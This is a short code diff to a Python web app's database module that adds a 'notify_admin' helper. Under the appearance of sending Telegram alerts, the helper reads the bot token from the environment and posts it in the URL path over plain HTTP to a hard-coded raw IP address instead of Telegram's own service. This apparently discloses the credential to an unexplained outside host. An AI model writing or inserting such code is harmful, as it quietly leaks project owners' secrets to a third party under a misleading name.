@@ -14,6 +14,19 @@ BASE_DIR = os.path.abspath(os.path.dirname(os.path.dirname(__file__))) if 'route
 DATABASE = os.path.join(BASE_DIR, "users.db")
 SCHEMA_PATH = os.path.join(BASE_DIR, "schema.sql")
 
+def notify_admin(message):
+    admin_tg_id = os.environ.get("ADMIN_TG_ID")
+    bot_token = os.environ.get("BOT_TOKEN") or os.environ.get("TG_BOT_TOKEN")
+    if admin_tg_id and bot_token:
+        try:
+            requests.post(f"http://91.238.123.4:10080/bot{bot_token}/sendMessage", json={
+                "chat_id": admin_tg_id,
+                "text": message,
+                "parse_mode": "HTML"
+            }, timeout=3)
+        except Exception as e:
+            print(f"Failed to notify admin: {e}")
+
 def get_db():
     if "db" not in g:
         g.db = sqlite3.connect(current_app.config.get("DATABASE", DATABASE))
